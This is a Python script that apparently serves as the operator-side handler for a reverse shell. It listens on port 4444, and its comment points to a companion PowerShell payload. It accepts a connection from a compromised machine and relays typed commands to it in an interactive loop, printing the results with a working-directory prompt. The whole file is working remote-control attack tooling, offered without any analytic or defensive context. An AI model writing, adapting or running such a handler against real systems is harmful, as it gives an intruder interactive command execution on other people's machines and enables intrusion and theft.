import socket

def listener(ip, port):
    port = int(port)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(1)
    print(f"[*] Listening on {ip}:{port}...")
    
    client, addr = server.accept()
    print(f"[*] Connection received from {addr[0]}:{addr[1]}")
    
    client.sendall(b"pwd\n")
    prompt = client.recv(1024).decode(errors='ignore').strip() + " >>> "

    
    while True:
        try:
            cmd = input(prompt)
            if not cmd:
                continue
            elif cmd.lower() in ["exit", "quit"]:
                print("[*] Closing connection...")
                client.sendall(b"exit\n")
                break
            
            client.sendall(cmd.encode() + b"\n")
            
            output = ""
            while True:
                chunk = client.recv(1024).decode(errors='ignore')
                if not chunk:
                    break
                output += chunk
                if output.endswith("\n"):
                    break
            
            lines = output.split("\n")
            
            client.sendall(b"pwd\n")
            prompt = client.recv(1024).decode(errors='ignore').strip() + " >>> "
            
            print("\n".join(lines[:-2]))
        except Exception as e:
            print(f"[!] Error: {e}")
            break
    
    client.close()
    server.close()
    print("[*] Listener stopped.")

if __name__ == "__main__":
    LISTEN_IP = "0.0.0.0"  # Change if needed
    LISTEN_PORT = 4444  # Match PowerShell script
    listener(LISTEN_IP, LISTEN_PORT)
